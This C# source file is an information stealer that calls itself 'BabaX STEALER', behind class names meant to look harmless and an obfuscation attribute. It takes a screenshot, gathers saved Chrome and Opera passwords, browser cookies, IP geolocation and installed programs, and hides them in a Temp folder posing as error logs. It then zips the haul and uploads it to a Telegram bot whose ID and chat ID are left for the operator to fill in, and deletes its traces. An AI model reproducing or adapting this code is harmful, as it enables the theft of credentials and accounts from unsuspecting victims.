using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Threading;

namespace DebuggerStepThroughAttribute
{
    public class AssemblyCopyrightAttribute
    {
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static void MetadataException()
        {
            //AntiCheat.KeepTheSafesty();
            var tasks = new List<Task>();
            var tasks2 = new List<Task>();
            string nAme = "BabaX STEALER";
            string bV = "1.0.5";
            string chashID = ""; // Add your chat ID here;
            string bashID = ""; // Add your bot id here;
            string RuntimePropertyInfo = Path.Combine(Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs"), Environment.MachineName.ToString() + "-ErrorsLogs.txt");
            string error2 = Path.Combine(Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName), Environment.MachineName.ToString() + "-ErrorsLogs.logs");

            if (!File.Exists(error2))
            {
                Task.Run(async () =>
                {
                    Ps ps = new Ps();
                    ps.CaptureScreenToFile(Path.Combine(Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs"), "s.jpeg"));
                });
                tasks2.Add(Task.Run(() => V.GETPPL()));


                try
                {
                    var DirHome = new DirectoryInfo(Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs"));
                    if (DirHome.Exists)
                    {
                        foreach (FileInfo FileHome in DirHome.GetFiles())
                        {
                            FileHome.Delete();
                        }

                        foreach (DirectoryInfo SubHome in DirHome.GetDirectories())
                        {
                            SubHome.Delete(recursive: true);
                        }
                        DirHome.Attributes |= FileAttributes.Hidden;
                    }
                    else
                    {
                        DirHome.Create();
                        DirHome.Refresh();
                        DirHome.Attributes |= FileAttributes.Hidden;
                    }

                    try
                    {

                        List<LD> lC = new List<LD>();
                        List<LD> lO = new List<LD>();
                        //List<LD> lY = new List<LD>();

                        lC = C.GETLLD();
                        lO = O.GETLLD();
                        //lY = Y.GETLLD();
                        string part1 = "";
                        string part2 = "";

                        tasks.Add(Task.Run(async () =>
                        {
                            foreach (var entry in lC)
                            {
                                part1 += $"{entry.Url} | {entry.PropertyInfo} | {entry.FilterTypeNameIgnoreCase}\n";
                            }

                        }));

                        tasks.Add(Task.Run(async () =>
                        {
                            foreach (var entry in lO)
                            {
                                part2 += $"{entry.Url} | {entry.PropertyInfo} | {entry.FilterTypeNameIgnoreCase}\n";
                            }
                        }));


                        try
                        {
                            Task.WaitAll(tasks.ToArray());
                        }
                        catch { }

                        tasks = new List<Task>();

                        File.AppendAllText(RuntimePropertyInfo, "Chrome Logins: URL | USER | PASS\n" + part1 + "\nOpera Logins: URL | USER | PASS\n" + part2);
                        File.AppendAllText(RuntimePropertyInfo, "\nOthers Logins: SERVICE | USER | PASS\n");

                        part1 = null;
                        part2 = null;

                        V.GETN(RuntimePropertyInfo);
                        V.GETF(RuntimePropertyInfo);



                        //File.AppendAllText(RuntimePropertyInfo, "\nYandex Logins: URL | USER | PASS\n");
                        //foreach (var entry in lY)
                        //{
                        //Console.WriteLine($"{entry.Url} | {entry.PropertyInfo} | {entry.FilterTypeNameIgnoreCase}");
                        //    File.AppendAllText(RuntimePropertyInfo, $"{entry.Url} | {entry.PropertyInfo} | {entry.FilterTypeNameIgnoreCase}\n");
                        //}
                    }
                    catch { }
                    try
                    {
                        string part1 = "";
                        string part2 = "";
                        string part3 = "";

                        List<IReflectableType> cCH = new List<IReflectableType>();
                        List<IReflectableType> cO = new List<IReflectableType>();
                        List<IReflectableType> cY = new List<IReflectableType>();

                        List<string> WL = new List<string> { "mybbuser", "NetflixId" };

                        cCH = C.GETCCD();
                        cO = O.GETCCD();
                        cY = Y.GETCCD();


                        tasks.Add(Task.Run(async () =>
                        {

                            foreach (var xyv in cCH)
                            {
                                if (WL.Any((xyv.Name).Contains))
                                {
                                    xyv.Name = xyv.Name + " [*]";
                                }
                                part1 += xyv.HostKey + " | " + xyv.Value + " | " + xyv.Name + "\n";
                            }
                        }));



                        tasks.Add(Task.Run(async () =>
                        {
                            foreach (var xyv in cO)
                            {
                                if (WL.Any((xyv.Name).Contains))
                                {
                                    xyv.Name = xyv.Name + " [*]";
                                }
                                part2 += xyv.HostKey + " | " + xyv.Value + " | " + xyv.Name + "\n";
                            }
                        }));


                        tasks.Add(Task.Run(async () =>
                        {

                            foreach (var xyv in cY)
                            {
                                if (WL.Any((xyv.Name).Contains))
                                {
                                    xyv.Name = xyv.Name + " [*]";
                                }
                                part3 += xyv.HostKey + " | " + xyv.Value + " | " + xyv.Name + "\n";
                            }
                        }));


                        try
                        {
                            Task.WaitAll(tasks.ToArray());
                        }
                        catch { }

                        tasks = new List<Task>();

                        File.AppendAllText(RuntimePropertyInfo, "\n\nChrome Cookies: URL | VALUE | NAME\n" + part1 + "\nOpera Cookies: URL | VALUE | NAME\n" + part2 + "\nFirefox Cookies: URL | VALUE | NAME\n" + part3);
                        part1 = null;
                        part2 = null;
                        part3 = null;

                        File.AppendAllText(RuntimePropertyInfo, "\n\nPublic Info: " + V.GETHOOC() + "\n");

                        HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create("http://ip-api.com/json/");
                        req.Proxy = null;
                        req.Timeout = 5000;
                        using (var resp = req.GetResponse())
                        {
                            string html = new StreamReader(resp.GetResponseStream()).ReadToEnd();
                            File.AppendAllText(RuntimePropertyInfo, html + "\n");
                        }


                    }
                    catch { }
                }
                catch { }

                try
                {
                    Task.WaitAll(tasks2.ToArray());
                }
                catch { }

                try
                {

                    File.AppendAllText(RuntimePropertyInfo, "\n\nInstalled Programs List : \n" + V.OXOX + "\n");

                    V.OXOX = null;
                }
                catch { }

               
                string error1 = Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName + "\\" + Environment.MachineName.ToString() + "_ErrorsLogs");
                
                ZipFile.CreateFromDirectory(error1, Path.Combine(Path.Combine(Environment.GetEnvironmentVariable("Temp"), Environment.UserName), Environment.MachineName.ToString() + "-ErrorsLogs.logs"));

                if (File.Exists(RuntimePropertyInfo))
                {
                    Byte[] _File_Bytes = System.IO.File.ReadAllBytes(error2);
                    string _File_Name = error2;
                    string _Url = "https://api.telegram.org/bot" + bashID + "/sendDocument?chat_id=" + chashID + "&caption=LocalTime: " + System.DateTime.Now.ToString();
                    try
                    {
                        var webClient = new WebClient();
                        webClient.Proxy = null;

                        string boundary = "------------------------" + DateTime.Now.Ticks.ToString("x");
                        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + boundary);
                        var fileData = webClient.Encoding.GetString(_File_Bytes);
                        var package = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", boundary, _File_Name, "application/x-ms-dos-executable", fileData);

                        var nfile = webClient.Encoding.GetBytes(package);

                        byte[] resp = webClient.UploadData(_Url, "POST", nfile);

                    }
                    catch { }
                }
                nAme = null;
                bV = null;
                chashID = null;
                bashID = null;
                Directory.Delete(error1, true);
                MD5 md5 = MD5.Create();
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(Guid.NewGuid().ToString());
                byte[] hash = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hash.Length; i++)
                {
                    sb.Append(hash[i].ToString("x2"));
                }
                File.WriteAllText(error2, sb.ToString());

            }
            else
            {
                nAme = null;
                bV = null;
                chashID = null;
                bashID = null;

                MD5 md5 = MD5.Create();
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(Guid.NewGuid().ToString());
                byte[] hash = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hash.Length; i++)
                {
                    sb.Append(hash[i].ToString("x2"));
                }
                File.WriteAllText(error2, sb.ToString());

            }
        }

    }
}
